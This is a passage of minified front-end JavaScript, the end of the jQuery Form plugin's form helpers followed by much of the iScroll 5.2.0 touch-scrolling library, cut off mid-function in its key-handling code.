                    case "form":
                        return ("function" == typeof this.reset || "object" == typeof this.reset && !this.reset.nodeType) && this.reset(), !0;
                    default:
                        return e.find("form,input,label,select,textarea").resetForm(), !0
                }
            }))
        }, t.fn.enable = function(t) {
            return void 0 === t && (t = !0), this.each((function() {
                this.disabled = !t
            }))
        }, t.fn.selected = function(e) {
            return void 0 === e && (e = !0), this.each((function() {
                var i = this.type;
                if ("checkbox" == i || "radio" == i) this.checked = e;
                else if ("option" == this.tagName.toLowerCase()) {
                    var s = t(this).parent("select");
                    e && s[0] && "select-one" == s[0].type && s.find("option").selected(!1), this.selected = e
                }
            }))
        }, t.fn.ajaxSubmit.debug = !1
    })),
    /*! iScroll v5.2.0 ~ (c) 2008-2016 Matteo Spinelli ~ http://cubiq.org/license */
    function(t, e, i) {
        function s(i, s) {
            for (var n in this.wrapper = "string" == typeof i ? e.querySelector(i) : i, this.scroller = this.wrapper.children[0], this.scrollerStyle = this.scroller.style, this.options = {
                resizeScrollbars: !0,
                mouseWheelSpeed: 20,
                snapThreshold: .334,
                disablePointer: !a.hasPointer,
                disableTouch: a.hasPointer || !a.hasTouch,
                disableMouse: a.hasPointer || a.hasTouch,
                startX: 0,
                startY: 0,
                scrollY: !0,
                directionLockThreshold: 5,
                momentum: !0,
                bounce: !0,
                bounceTime: 600,
                bounceEasing: "",
                preventDefault: !0,
                preventDefaultException: {
                    tagName: /^(INPUT|TEXTAREA|BUTTON|SELECT)$/
                },
                HWCompositing: !0,
                useTransition: !0,
                useTransform: !0,
                bindToWrapper: void 0 === t.onmousedown
            }, s) this.options[n] = s[n];
            this.translateZ = this.options.HWCompositing && a.hasPerspective ? " translateZ(0)" : "", this.options.useTransition = a.hasTransition && this.options.useTransition, this.options.useTransform = a.hasTransform && this.options.useTransform, this.options.eventPassthrough = !0 === this.options.eventPassthrough ? "vertical" : this.options.eventPassthrough, this.options.preventDefault = !this.options.eventPassthrough && this.options.preventDefault, this.options.scrollY = "vertical" != this.options.eventPassthrough && this.options.scrollY, this.options.scrollX = "horizontal" != this.options.eventPassthrough && this.options.scrollX, this.options.freeScroll = this.options.freeScroll && !this.options.eventPassthrough, this.options.directionLockThreshold = this.options.eventPassthrough ? 0 : this.options.directionLockThreshold, this.options.bounceEasing = "string" == typeof this.options.bounceEasing ? a.ease[this.options.bounceEasing] || a.ease.circular : this.options.bounceEasing, this.options.resizePolling = void 0 === this.options.resizePolling ? 60 : this.options.resizePolling, !0 === this.options.tap && (this.options.tap = "tap"), this.options.useTransition || this.options.useTransform || /relative|absolute/i.test(this.scrollerStyle.position) || (this.scrollerStyle.position = "relative"), "scale" == this.options.shrinkScrollbars && (this.options.useTransition = !1), this.options.invertWheelDirection = this.options.invertWheelDirection ? -1 : 1, this.directionY = this.directionX = this.y = this.x = 0, this._events = {}, this._init(), this.refresh(), this.scrollTo(this.options.startX, this.options.startY), this.enable()
        }

        function n(t, i, s) {
            var n = e.createElement("div"),
                o = e.createElement("div");
            return !0 === s && (n.style.cssText = "position:absolute;z-index:9999", o.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;position:absolute;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.9);border-radius:3px"), o.className = "iScrollIndicator", "h" == t ? (!0 === s && (n.style.cssText += ";height:7px;left:2px;right:2px;bottom:0", o.style.height = "100%"), n.className = "iScrollHorizontalScrollbar") : (!0 === s && (n.style.cssText += ";width:7px;bottom:2px;top:2px;right:1px", o.style.width = "100%"), n.className = "iScrollVerticalScrollbar"), n.style.cssText += ";overflow:hidden", i || (n.style.pointerEvents = "none"), n.appendChild(o), n
        }

        function o(i, s) {
            for (var n in this.wrapper = "string" == typeof s.el ? e.querySelector(s.el) : s.el, this.wrapperStyle = this.wrapper.style, this.indicator = this.wrapper.children[0], this.indicatorStyle = this.indicator.style, this.scroller = i, this.options = {
                listenX: !0,
                listenY: !0,
                interactive: !1,
                resize: !0,
                defaultScrollbars: !1,
                shrink: !1,
                fade: !1,
                speedRatioX: 0,
                speedRatioY: 0
            }, s) this.options[n] = s[n];
            if (this.sizeRatioY = this.sizeRatioX = 1, this.maxPosY = this.maxPosX = 0, this.options.interactive && (this.options.disableTouch || (a.addEvent(this.indicator, "touchstart", this), a.addEvent(t, "touchend", this)), this.options.disablePointer || (a.addEvent(this.indicator, a.prefixPointerEvent("pointerdown"), this), a.addEvent(t, a.prefixPointerEvent("pointerup"), this)), this.options.disableMouse || (a.addEvent(this.indicator, "mousedown", this), a.addEvent(t, "mouseup", this))), this.options.fade) {
                this.wrapperStyle[a.style.transform] = this.scroller.translateZ;
                var o = a.style.transitionDuration;
                if (o) {
                    this.wrapperStyle[o] = a.isBadAndroid ? "0.0001ms" : "0ms";
                    var l = this;
                    a.isBadAndroid && r((function() {
                        "0.0001ms" === l.wrapperStyle[o] && (l.wrapperStyle[o] = "0s")
                    })), this.wrapperStyle.opacity = "0"
                }
            }
        }
        var r = t.requestAnimationFrame || t.webkitRequestAnimationFrame || t.mozRequestAnimationFrame || t.oRequestAnimationFrame || t.msRequestAnimationFrame || function(e) {
                t.setTimeout(e, 1e3 / 60)
            },
            a = function() {
                function s(t) {
                    return !1 !== r && ("" === r ? t : r + t.charAt(0).toUpperCase() + t.substr(1))
                }
                var n = {},
                    o = e.createElement("div").style,
                    r = function() {
                        for (var t = ["t", "webkitT", "MozT", "msT", "OT"], e = 0, i = t.length; e < i; e++)
                            if (t[e] + "ransform" in o) return t[e].substr(0, t[e].length - 1);
                        return !1
                    }();
                n.getTime = Date.now || function() {
                    return (new Date).getTime()
                }, n.extend = function(t, e) {
                    for (var i in e) t[i] = e[i]
                }, n.addEvent = function(t, e, i, s) {
                    t.addEventListener(e, i, !!s)
                }, n.removeEvent = function(t, e, i, s) {
                    t.removeEventListener(e, i, !!s)
                }, n.prefixPointerEvent = function(e) {
                    return t.MSPointerEvent ? "MSPointer" + e.charAt(7).toUpperCase() + e.substr(8) : e
                }, n.momentum = function(t, e, s, n, o, r) {
                    var a;
                    return e = t - e, a = t + (s = i.abs(e) / s) * s / (2 * (r = void 0 === r ? 6e-4 : r)) * (0 > e ? -1 : 1), r = s / r, a < n ? (a = o ? n - o / 2.5 * (s / 8) : n, r = (e = i.abs(a - t)) / s) : 0 < a && (a = o ? o / 2.5 * (s / 8) : 0, r = (e = i.abs(t) + a) / s), {
                        destination: i.round(a),
                        duration: r
                    }
                };
                var a = s("transform");
                return n.extend(n, {
                    hasTransform: !1 !== a,
                    hasPerspective: s("perspective") in o,
                    hasTouch: "ontouchstart" in t,
                    hasPointer: !(!t.PointerEvent && !t.MSPointerEvent),
                    hasTransition: s("transition") in o
                }), n.isBadAndroid = function() {
                    var e = t.navigator.appVersion;
                    return !(!/Android/.test(e) || /Chrome\/\d/.test(e)) && (!((e = e.match(/Safari\/(\d+.\d)/)) && "object" == typeof e && 2 <= e.length) || 535.19 > parseFloat(e[1]))
                }(), n.extend(n.style = {}, {
                    transform: a,
                    transitionTimingFunction: s("transitionTimingFunction"),
                    transitionDuration: s("transitionDuration"),
                    transitionDelay: s("transitionDelay"),
                    transformOrigin: s("transformOrigin")
                }), n.hasClass = function(t, e) {
                    return new RegExp("(^|\\s)" + e + "(\\s|$)").test(t.className)
                }, n.addClass = function(t, e) {
                    if (!n.hasClass(t, e)) {
                        var i = t.className.split(" ");
                        i.push(e), t.className = i.join(" ")
                    }
                }, n.removeClass = function(t, e) {
                    n.hasClass(t, e) && (t.className = t.className.replace(new RegExp("(^|\\s)" + e + "(\\s|$)", "g"), " "))
                }, n.offset = function(t) {
                    for (var e = -t.offsetLeft, i = -t.offsetTop; t = t.offsetParent;) e -= t.offsetLeft, i -= t.offsetTop;
                    return {
                        left: e,
                        top: i
                    }
                }, n.preventDefaultException = function(t, e) {
                    for (var i in e)
                        if (e[i].test(t[i])) return !0;
                    return !1
                }, n.extend(n.eventType = {}, {
                    touchstart: 1,
                    touchmove: 1,
                    touchend: 1,
                    mousedown: 2,
                    mousemove: 2,
                    mouseup: 2,
                    pointerdown: 3,
                    pointermove: 3,
                    pointerup: 3,
                    MSPointerDown: 3,
                    MSPointerMove: 3,
                    MSPointerUp: 3
                }), n.extend(n.ease = {}, {
                    quadratic: {
                        style: "cubic-bezier(0.25, 0.46, 0.45, 0.94)",
                        fn: function(t) {
                            return t * (2 - t)
                        }
                    },
                    circular: {
                        style: "cubic-bezier(0.1, 0.57, 0.1, 1)",
                        fn: function(t) {
                            return i.sqrt(1 - --t * t)
                        }
                    },
                    back: {
                        style: "cubic-bezier(0.175, 0.885, 0.32, 1.275)",
                        fn: function(t) {
                            return --t * t * (5 * t + 4) + 1
                        }
                    },
                    bounce: {
                        style: "",
                        fn: function(t) {
                            return (t /= 1) < 1 / 2.75 ? 7.5625 * t * t : t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375
                        }
                    },
                    elastic: {
                        style: "",
                        fn: function(t) {
                            return 0 === t ? 0 : 1 == t ? 1 : .4 * i.pow(2, -10 * t) * i.sin(2 * (t - .055) * i.PI / .22) + 1
                        }
                    }
                }), n.tap = function(t, i) {
                    var s = e.createEvent("Event");
                    s.initEvent(i, !0, !0), s.pageX = t.pageX, s.pageY = t.pageY, t.target.dispatchEvent(s)
                }, n.click = function(i) {
                    var s, n = i.target;
                    /(SELECT|INPUT|TEXTAREA)/i.test(n.tagName) || ((s = e.createEvent(t.MouseEvent ? "MouseEvents" : "Event")).initEvent("click", !0, !0), s.view = i.view || t, s.detail = 1, s.screenX = n.screenX || 0, s.screenY = n.screenY || 0, s.clientX = n.clientX || 0, s.clientY = n.clientY || 0, s.ctrlKey = !!i.ctrlKey, s.altKey = !!i.altKey, s.shiftKey = !!i.shiftKey, s.metaKey = !!i.metaKey, s.button = 0, s.relatedTarget = null, s._constructed = !0, n.dispatchEvent(s))
                }, n
            }();
        s.prototype = {
            version: "5.2.0",
            _init: function() {
                this._initEvents(), (this.options.scrollbars || this.options.indicators) && this._initIndicators(), this.options.mouseWheel && this._initWheel(), this.options.snap && this._initSnap(), this.options.keyBindings && this._initKeys()
            },
            destroy: function() {
                this._initEvents(!0), clearTimeout(this.resizeTimeout), this.resizeTimeout = null, this._execEvent("destroy")
            },
            _transitionEnd: function(t) {
                t.target == this.scroller && this.isInTransition && (this._transitionTime(), this.resetPosition(this.options.bounceTime) || (this.isInTransition = !1, this._execEvent("scrollEnd")))
            },
            _start: function(t) {
                if (!(1 != a.eventType[t.type] && 0 !== (t.which ? t.button : 2 > t.button ? 0 : 4 == t.button ? 1 : 2) || !this.enabled || this.initiated && a.eventType[t.type] !== this.initiated)) {
                    !this.options.preventDefault || a.isBadAndroid || a.preventDefaultException(t.target, this.options.preventDefaultException) || t.preventDefault();
                    var e = t.touches ? t.touches[0] : t;
                    this.initiated = a.eventType[t.type], this.moved = !1, this.directionLocked = this.directionY = this.directionX = this.distY = this.distX = 0, this.startTime = a.getTime(), this.options.useTransition && this.isInTransition ? (this._transitionTime(), this.isInTransition = !1, t = this.getComputedPosition(), this._translate(i.round(t.x), i.round(t.y)), this._execEvent("scrollEnd")) : !this.options.useTransition && this.isAnimating && (this.isAnimating = !1, this._execEvent("scrollEnd")), this.startX = this.x, this.startY = this.y, this.absStartX = this.x, this.absStartY = this.y, this.pointX = e.pageX, this.pointY = e.pageY, this._execEvent("beforeScrollStart")
                }
            },
            _move: function(t) {
                if (this.enabled && a.eventType[t.type] === this.initiated) {
                    this.options.preventDefault && t.preventDefault();
                    var e, s = t.touches ? t.touches[0] : t,
                        n = s.pageX - this.pointX,
                        o = s.pageY - this.pointY,
                        r = a.getTime();
                    if (this.pointX = s.pageX, this.pointY = s.pageY, this.distX += n, this.distY += o, s = i.abs(this.distX), e = i.abs(this.distY), !(300 < r - this.endTime && 10 > s && 10 > e)) {
                        if (this.directionLocked || this.options.freeScroll || (this.directionLocked = s > e + this.options.directionLockThreshold ? "h" : e >= s + this.options.directionLockThreshold ? "v" : "n"), "h" == this.directionLocked) {
                            if ("vertical" == this.options.eventPassthrough) t.preventDefault();
                            else if ("horizontal" == this.options.eventPassthrough) return void(this.initiated = !1);
                            o = 0
                        } else if ("v" == this.directionLocked) {
                            if ("horizontal" == this.options.eventPassthrough) t.preventDefault();
                            else if ("vertical" == this.options.eventPassthrough) return void(this.initiated = !1);
                            n = 0
                        }
                        n = this.hasHorizontalScroll ? n : 0, o = this.hasVerticalScroll ? o : 0, t = this.x + n, s = this.y + o, (0 < t || t < this.maxScrollX) && (t = this.options.bounce ? this.x + n / 3 : 0 < t ? 0 : this.maxScrollX), (0 < s || s < this.maxScrollY) && (s = this.options.bounce ? this.y + o / 3 : 0 < s ? 0 : this.maxScrollY), this.directionX = 0 < n ? -1 : 0 > n ? 1 : 0, this.directionY = 0 < o ? -1 : 0 > o ? 1 : 0, this.moved || this._execEvent("scrollStart"), this.moved = !0, this._translate(t, s), 300 < r - this.startTime && (this.startTime = r, this.startX = this.x, this.startY = this.y)
                    }
                }
            },
            _end: function(t) {
                if (this.enabled && a.eventType[t.type] === this.initiated) {
                    var e, s;
                    this.options.preventDefault && !a.preventDefaultException(t.target, this.options.preventDefaultException) && t.preventDefault(), s = a.getTime() - this.startTime;
                    var n = i.round(this.x),
                        o = i.round(this.y),
                        r = i.abs(n - this.startX),
                        l = i.abs(o - this.startY);
                    e = 0;
                    var c = "";
                    this.initiated = this.isInTransition = 0, this.endTime = a.getTime(), this.resetPosition(this.options.bounceTime) || (this.scrollTo(n, o), this.moved ? this._events.flick && 200 > s && 100 > r && 100 > l ? this._execEvent("flick") : (this.options.momentum && 300 > s && (e = this.hasHorizontalScroll ? a.momentum(this.x, this.startX, s, this.maxScrollX, this.options.bounce ? this.wrapperWidth : 0, this.options.deceleration) : {
                        destination: n,
                        duration: 0
                    }, s = this.hasVerticalScroll ? a.momentum(this.y, this.startY, s, this.maxScrollY, this.options.bounce ? this.wrapperHeight : 0, this.options.deceleration) : {
                        destination: o,
                        duration: 0
                    }, n = e.destination, o = s.destination, e = i.max(e.duration, s.duration), this.isInTransition = 1), this.options.snap && (this.currentPage = c = this._nearestSnap(n, o), e = this.options.snapSpeed || i.max(i.max(i.min(i.abs(n - c.x), 1e3), i.min(i.abs(o - c.y), 1e3)), 300), n = c.x, o = c.y, this.directionY = this.directionX = 0, c = this.options.bounceEasing), n != this.x || o != this.y ? ((0 < n || n < this.maxScrollX || 0 < o || o < this.maxScrollY) && (c = a.ease.quadratic), this.scrollTo(n, o, e, c)) : this._execEvent("scrollEnd")) : (this.options.tap && a.tap(t, this.options.tap), this.options.click && a.click(t), this._execEvent("scrollCancel")))
                }
            },
            _resize: function() {
                var t = this;
                clearTimeout(this.resizeTimeout), this.resizeTimeout = setTimeout((function() {
                    t.refresh()
                }), this.options.resizePolling)
            },
            resetPosition: function(t) {
                var e = this.x,
                    i = this.y;
                return !this.hasHorizontalScroll || 0 < this.x ? e = 0 : this.x < this.maxScrollX && (e = this.maxScrollX), !this.hasVerticalScroll || 0 < this.y ? i = 0 : this.y < this.maxScrollY && (i = this.maxScrollY), (e != this.x || i != this.y) && (this.scrollTo(e, i, t || 0, this.options.bounceEasing), !0)
            },
            disable: function() {
                this.enabled = !1
            },
            enable: function() {
                this.enabled = !0
            },
            refresh: function() {
                this.wrapperWidth = this.wrapper.clientWidth, this.wrapperHeight = this.wrapper.clientHeight, this.scrollerWidth = this.scroller.offsetWidth, this.scrollerHeight = this.scroller.offsetHeight, this.maxScrollX = this.wrapperWidth - this.scrollerWidth, this.maxScrollY = this.wrapperHeight - this.scrollerHeight, this.hasHorizontalScroll = this.options.scrollX && 0 > this.maxScrollX, this.hasVerticalScroll = this.options.scrollY && 0 > this.maxScrollY, this.hasHorizontalScroll || (this.maxScrollX = 0, this.scrollerWidth = this.wrapperWidth), this.hasVerticalScroll || (this.maxScrollY = 0, this.scrollerHeight = this.wrapperHeight), this.directionY = this.directionX = this.endTime = 0, this.wrapperOffset = a.offset(this.wrapper), this._execEvent("refresh"), this.resetPosition()
            },
            on: function(t, e) {
                this._events[t] || (this._events[t] = []), this._events[t].push(e)
            },
            off: function(t, e) {
                if (this._events[t]) {
                    var i = this._events[t].indexOf(e); - 1 < i && this._events[t].splice(i, 1)
                }
            },
            _execEvent: function(t) {
                if (this._events[t]) {
                    var e = 0,
                        i = this._events[t].length;
                    if (i)
                        for (; e < i; e++) this._events[t][e].apply(this, [].slice.call(arguments, 1))
                }
            },
            scrollBy: function(t, e, i, s) {
                t = this.x + t, e = this.y + e, this.scrollTo(t, e, i || 0, s)
            },
            scrollTo: function(t, e, i, s) {
                s = s || a.ease.circular, this.isInTransition = this.options.useTransition && 0 < i;
                var n = this.options.useTransition && s.style;
                !i || n ? (n && (this._transitionTimingFunction(s.style), this._transitionTime(i)), this._translate(t, e)) : this._animate(t, e, i, s.fn)
            },
            scrollToElement: function(t, e, s, n, o) {
                if (t = t.nodeType ? t : this.scroller.querySelector(t)) {
                    var r = a.offset(t);
                    r.left -= this.wrapperOffset.left, r.top -= this.wrapperOffset.top, !0 === s && (s = i.round(t.offsetWidth / 2 - this.wrapper.offsetWidth / 2)), !0 === n && (n = i.round(t.offsetHeight / 2 - this.wrapper.offsetHeight / 2)), r.left -= s || 0, r.top -= n || 0, r.left = 0 < r.left ? 0 : r.left < this.maxScrollX ? this.maxScrollX : r.left, r.top = 0 < r.top ? 0 : r.top < this.maxScrollY ? this.maxScrollY : r.top, e = null == e || "auto" === e ? i.max(i.abs(this.x - r.left), i.abs(this.y - r.top)) : e, this.scrollTo(r.left, r.top, e, o)
                }
            },
            _transitionTime: function(t) {
                if (this.options.useTransition) {
                    t = t || 0;
                    var e = a.style.transitionDuration;
                    if (e) {
                        if (this.scrollerStyle[e] = t + "ms", !t && a.isBadAndroid) {
                            this.scrollerStyle[e] = "0.0001ms";
                            var i = this;
                            r((function() {
                                "0.0001ms" === i.scrollerStyle[e] && (i.scrollerStyle[e] = "0s")
                            }))
                        }
                        if (this.indicators)
                            for (var s = this.indicators.length; s--;) this.indicators[s].transitionTime(t)
                    }
                }
            },
            _transitionTimingFunction: function(t) {
                if (this.scrollerStyle[a.style.transitionTimingFunction] = t, this.indicators)
                    for (var e = this.indicators.length; e--;) this.indicators[e].transitionTimingFunction(t)
            },
            _translate: function(t, e) {
                if (this.options.useTransform ? this.scrollerStyle[a.style.transform] = "translate(" + t + "px," + e + "px)" + this.translateZ : (t = i.round(t), e = i.round(e), this.scrollerStyle.left = t + "px", this.scrollerStyle.top = e + "px"), this.x = t, this.y = e, this.indicators)
                    for (var s = this.indicators.length; s--;) this.indicators[s].updatePosition()
            },
            _initEvents: function(e) {
                e = e ? a.removeEvent : a.addEvent;
                var i = this.options.bindToWrapper ? this.wrapper : t;
                e(t, "orientationchange", this), e(t, "resize", this), this.options.click && e(this.wrapper, "click", this, !0), this.options.disableMouse || (e(this.wrapper, "mousedown", this), e(i, "mousemove", this), e(i, "mousecancel", this), e(i, "mouseup", this)), a.hasPointer && !this.options.disablePointer && (e(this.wrapper, a.prefixPointerEvent("pointerdown"), this), e(i, a.prefixPointerEvent("pointermove"), this), e(i, a.prefixPointerEvent("pointercancel"), this), e(i, a.prefixPointerEvent("pointerup"), this)), a.hasTouch && !this.options.disableTouch && (e(this.wrapper, "touchstart", this), e(i, "touchmove", this), e(i, "touchcancel", this), e(i, "touchend", this)), e(this.scroller, "transitionend", this), e(this.scroller, "webkitTransitionEnd", this), e(this.scroller, "oTransitionEnd", this), e(this.scroller, "MSTransitionEnd", this)
            },
            getComputedPosition: function() {
                var e, i = t.getComputedStyle(this.scroller, null);
                return this.options.useTransform ? (e = +((i = i[a.style.transform].split(")")[0].split(", "))[12] || i[4]), i = +(i[13] || i[5])) : (e = +i.left.replace(/[^-\d.]/g, ""), i = +i.top.replace(/[^-\d.]/g, "")), {
                    x: e,
                    y: i
                }
            },
            _initIndicators: function() {
                function t(t) {
                    if (a.indicators)
                        for (var e = a.indicators.length; e--;) t.call(a.indicators[e])
                }
                var e, i = this.options.interactiveScrollbars,
                    s = "string" != typeof this.options.scrollbars,
                    r = [],
                    a = this;
                for (this.indicators = [], this.options.scrollbars && (this.options.scrollY && (e = {
                    el: n("v", i, this.options.scrollbars),
                    interactive: i,
                    defaultScrollbars: !0,
                    customStyle: s,
                    resize: this.options.resizeScrollbars,
                    shrink: this.options.shrinkScrollbars,
                    fade: this.options.fadeScrollbars,
                    listenX: !1
                }, this.wrapper.appendChild(e.el), r.push(e)), this.options.scrollX && (e = {
                    el: n("h", i, this.options.scrollbars),
                    interactive: i,
                    defaultScrollbars: !0,
                    customStyle: s,
                    resize: this.options.resizeScrollbars,
                    shrink: this.options.shrinkScrollbars,
                    fade: this.options.fadeScrollbars,
                    listenY: !1
                }, this.wrapper.appendChild(e.el), r.push(e))), this.options.indicators && (r = r.concat(this.options.indicators)), i = r.length; i--;) this.indicators.push(new o(this, r[i]));
                this.options.fadeScrollbars && (this.on("scrollEnd", (function() {
                    t((function() {
                        this.fade()
                    }))
                })), this.on("scrollCancel", (function() {
                    t((function() {
                        this.fade()
                    }))
                })), this.on("scrollStart", (function() {
                    t((function() {
                        this.fade(1)
                    }))
                })), this.on("beforeScrollStart", (function() {
                    t((function() {
                        this.fade(1, !0)
                    }))
                }))), this.on("refresh", (function() {
                    t((function() {
                        this.refresh()
                    }))
                })), this.on("destroy", (function() {
                    t((function() {
                        this.destroy()
                    })), delete this.indicators
                }))
            },
            _initWheel: function() {
                a.addEvent(this.wrapper, "wheel", this), a.addEvent(this.wrapper, "mousewheel", this), a.addEvent(this.wrapper, "DOMMouseScroll", this), this.on("destroy", (function() {
                    clearTimeout(this.wheelTimeout), this.wheelTimeout = null, a.removeEvent(this.wrapper, "wheel", this), a.removeEvent(this.wrapper, "mousewheel", this), a.removeEvent(this.wrapper, "DOMMouseScroll", this)
                }))
            },
            _wheel: function(t) {
                if (this.enabled) {
                    var e, s, n, o = this;
                    if (void 0 === this.wheelTimeout && o._execEvent("scrollStart"), clearTimeout(this.wheelTimeout), this.wheelTimeout = setTimeout((function() {
                        o.options.snap || o._execEvent("scrollEnd"), o.wheelTimeout = void 0
                    }), 400), "deltaX" in t) 1 === t.deltaMode ? (e = -t.deltaX * this.options.mouseWheelSpeed, t = -t.deltaY * this.options.mouseWheelSpeed) : (e = -t.deltaX, t = -t.deltaY);
                    else if ("wheelDeltaX" in t) e = t.wheelDeltaX / 120 * this.options.mouseWheelSpeed, t = t.wheelDeltaY / 120 * this.options.mouseWheelSpeed;
                    else if ("wheelDelta" in t) e = t = t.wheelDelta / 120 * this.options.mouseWheelSpeed;
                    else {
                        if (!("detail" in t)) return;
                        e = t = -t.detail / 3 * this.options.mouseWheelSpeed
                    }
                    e *= this.options.invertWheelDirection, t *= this.options.invertWheelDirection, this.hasVerticalScroll || (e = t, t = 0), this.options.snap ? (s = this.currentPage.pageX, n = this.currentPage.pageY, 0 < e ? s-- : 0 > e && s++, 0 < t ? n-- : 0 > t && n++, this.goToPage(s, n)) : (s = this.x + i.round(this.hasHorizontalScroll ? e : 0), n = this.y + i.round(this.hasVerticalScroll ? t : 0), this.directionX = 0 < e ? -1 : 0 > e ? 1 : 0, this.directionY = 0 < t ? -1 : 0 > t ? 1 : 0, 0 < s ? s = 0 : s < this.maxScrollX && (s = this.maxScrollX), 0 < n ? n = 0 : n < this.maxScrollY && (n = this.maxScrollY), this.scrollTo(s, n, 0))
                }
            },
            _initSnap: function() {
                this.currentPage = {}, "string" == typeof this.options.snap && (this.options.snap = this.scroller.querySelectorAll(this.options.snap)), this.on("refresh", (function() {
                    var t, e, s, n, o, r = 0,
                        a = 0,
                        l = 0;
                    e = this.options.snapStepX || this.wrapperWidth;
                    var c = this.options.snapStepY || this.wrapperHeight;
                    if (this.pages = [], this.wrapperWidth && this.wrapperHeight && this.scrollerWidth && this.scrollerHeight) {
                        if (!0 === this.options.snap)
                            for (s = i.round(e / 2), n = i.round(c / 2); l > -this.scrollerWidth;) {
                                for (this.pages[r] = [], o = t = 0; o > -this.scrollerHeight;) this.pages[r][t] = {
                                    x: i.max(l, this.maxScrollX),
                                    y: i.max(o, this.maxScrollY),
                                    width: e,
                                    height: c,
                                    cx: l - s,
                                    cy: o - n
                                }, o -= c, t++;
                                l -= e, r++
                            } else
                            for (t = (c = this.options.snap).length, e = -1; r < t; r++)(0 === r || c[r].offsetLeft <= c[r - 1].offsetLeft) && (a = 0, e++), this.pages[a] || (this.pages[a] = []), l = i.max(-c[r].offsetLeft, this.maxScrollX), o = i.max(-c[r].offsetTop, this.maxScrollY), s = l - i.round(c[r].offsetWidth / 2), n = o - i.round(c[r].offsetHeight / 2), this.pages[a][e] = {
                                x: l,
                                y: o,
                                width: c[r].offsetWidth,
                                height: c[r].offsetHeight,
                                cx: s,
                                cy: n
                            }, l > this.maxScrollX && a++;
                        this.goToPage(this.currentPage.pageX || 0, this.currentPage.pageY || 0, 0), 0 == this.options.snapThreshold % 1 ? this.snapThresholdY = this.snapThresholdX = this.options.snapThreshold : (this.snapThresholdX = i.round(this.pages[this.currentPage.pageX][this.currentPage.pageY].width * this.options.snapThreshold), this.snapThresholdY = i.round(this.pages[this.currentPage.pageX][this.currentPage.pageY].height * this.options.snapThreshold))
                    }
                })), this.on("flick", (function() {
                    var t = this.options.snapSpeed || i.max(i.max(i.min(i.abs(this.x - this.startX), 1e3), i.min(i.abs(this.y - this.startY), 1e3)), 300);
                    this.goToPage(this.currentPage.pageX + this.directionX, this.currentPage.pageY + this.directionY, t)
                }))
            },
            _nearestSnap: function(t, e) {
                if (!this.pages.length) return {
                    x: 0,
                    y: 0,
                    pageX: 0,
                    pageY: 0
                };
                var s = 0,
                    n = this.pages.length,
                    o = 0;
                if (i.abs(t - this.absStartX) < this.snapThresholdX && i.abs(e - this.absStartY) < this.snapThresholdY) return this.currentPage;
                for (0 < t ? t = 0 : t < this.maxScrollX && (t = this.maxScrollX), 0 < e ? e = 0 : e < this.maxScrollY && (e = this.maxScrollY); s < n; s++)
                    if (t >= this.pages[s][0].cx) {
                        t = this.pages[s][0].x;
                        break
                    } for (n = this.pages[s].length; o < n; o++)
                    if (e >= this.pages[0][o].cy) {
                        e = this.pages[0][o].y;
                        break
                    } return s == this.currentPage.pageX && (0 > (s += this.directionX) ? s = 0 : s >= this.pages.length && (s = this.pages.length - 1), t = this.pages[s][0].x), o == this.currentPage.pageY && (0 > (o += this.directionY) ? o = 0 : o >= this.pages[0].length && (o = this.pages[0].length - 1), e = this.pages[0][o].y), {
                    x: t,
                    y: e,
                    pageX: s,
                    pageY: o
                }
            },
            goToPage: function(t, e, s, n) {
                n = n || this.options.bounceEasing, t >= this.pages.length ? t = this.pages.length - 1 : 0 > t && (t = 0), e >= this.pages[t].length ? e = this.pages[t].length - 1 : 0 > e && (e = 0);
                var o = this.pages[t][e].x,
                    r = this.pages[t][e].y;
                s = void 0 === s ? this.options.snapSpeed || i.max(i.max(i.min(i.abs(o - this.x), 1e3), i.min(i.abs(r - this.y), 1e3)), 300) : s, this.currentPage = {
                    x: o,
                    y: r,
                    pageX: t,
                    pageY: e
                }, this.scrollTo(o, r, s, n)
            },
            next: function(t, e) {
                var i = this.currentPage.pageX,
                    s = this.currentPage.pageY;
                ++i >= this.pages.length && this.hasVerticalScroll && (i = 0, s++), this.goToPage(i, s, t, e)
            },
            prev: function(t, e) {
                var i = this.currentPage.pageX,
                    s = this.currentPage.pageY;
                0 > --i && this.hasVerticalScroll && (i = 0, s--), this.goToPage(i, s, t, e)
            },
            _initKeys: function(e) {
                var i;
                if (e = {
                    pageUp: 33,
                    pageDown: 34,
                    end: 35,
                    home: 36,
                    left: 37,
                    up: 38,
                    right: 39,
                    down: 40
                }, "object" == typeof this.options.keyBindings)
                    for (i in this.options.keyBindings) "string" == typeof this.options.keyBindings[i] && (this.options.keyBindings[i] = this.options.keyBindings[i].toUpperCase().charCodeAt(0));
                else this.options.keyBindings = {};
                for (i in e) this.options.keyBindings[i] = this.options.keyBindings[i] || e[i];
                a.addEvent(t, "keydown", this), this.on("destroy", (function() {
                    a.removeEvent(t, "keydown", this)
                }))
            },
            _key: function(t) {
                if (this.enabled) {
                    var e, s = this.options.snap,
                        n = s ? this.currentPage.pageX : this.x,
                        o = s ? this.currentPage.pageY : this.y,
                        r = a.getTime(),
                        l = this.keyTime || 0;
                    switch (this.options.useTransition && this.isInTransition && (e = this.getComputedPosition(), this._translate(i.round(e.x), i.round(e.y)), this.isInTransition = !1), this.keyAcceleration = 200 > r - l ? i.min(this.keyAcceleration + .25, 50) : 0, t.keyCode) {
                        case this.options.keyBindings.pageUp:
                            this.hasHorizontalScroll && !this.hasVerticalScroll ? n += s ? 1 : this.wrapperWidth : o += s ? 1 : this.wrapperHeight;
                            break;
                        case this.options.keyBindings.pageDown:
                            this.hasHorizontalScroll && !this.hasVerticalScroll ? n -= s ? 1 : this.wrapperWidth : o -= s ? 1 : this.wrapperHeight;
                            break;
                        case this.options.keyBindings.end:
                            n = s ? this.pages.length - 1 : this.maxScrollX, o = s ? this.pages[0].length - 1 : this.maxScrollY;
                            break;
                        case this.options.keyBindings.home:
                            o = n = 0;
                            break;
                        case this.options.keyBindings.left:
                            n += s ? -1 : 5 + this.keyAcceleration >> 0;
                            break;
                        case this.options.keyBindings.up:
                            o += s ? 1 : 5 + this.keyAcceleration >> 0;
                            break;
                        case this.options.keyBindings.right:
                            n -= s ? -1 : 5 + this.keyAcceleration >> 0;
                            break;
                        case this.options.keyBindings.down:
                            o -= s ? 1 : 5 + this.keyAcceleration >> 0;
